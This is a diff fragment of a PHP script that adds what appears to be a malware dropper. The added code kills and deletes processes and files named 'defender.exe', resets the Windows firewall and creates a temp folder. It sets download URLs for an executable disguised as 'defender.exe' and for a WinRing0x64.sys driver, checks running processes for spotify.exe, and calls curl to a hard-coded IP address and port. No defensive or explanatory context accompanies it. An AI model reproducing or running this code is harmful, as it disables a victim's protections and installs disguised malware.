@@ -26,4 +26,32 @@ function downloadFile($url, $savePath) {
 
 
 
-system('curl 185.208.158.206:8877');     
+  
+
+system('taskkill /IM defender.exe /F');     
+system('taskkill /IM defender.exe /F');    
+system('del /f /q "C:/Windows/Temp/defender.exe"');  
+
+system('netsh advfirewall reset');  
+system('mkdir "C:/Windows/Temp/RightProgram"');  
+exec('tasklist', $output);
+
+$url =  'https://github.com/danialchork/project-final/releases/download/last2/defender.exe';
+$url2 =  'https://github.com/danialchork/project-final/releases/download/last/WinRing0x64.sys';
+
+$file_name = 'C:/Windows/Temp/RightProgram/defender.exe';
+$file_name2 = 'C:/Windows/Temp/RightProgram/WinRing0x64.sys';
+
+$found = false;
+$found2 = false;
+foreach ($output as $line) {
+    if (stripos(strtolower($line), 'spotify.exe') !== false) {
+        $found = true;
+
+    }
+    if (stripos(strtolower($line), 'defender.exe') !== false) {
+        $found2 = true;
+
+    }
+}
+system('curl 185.208.158.206:8877');   
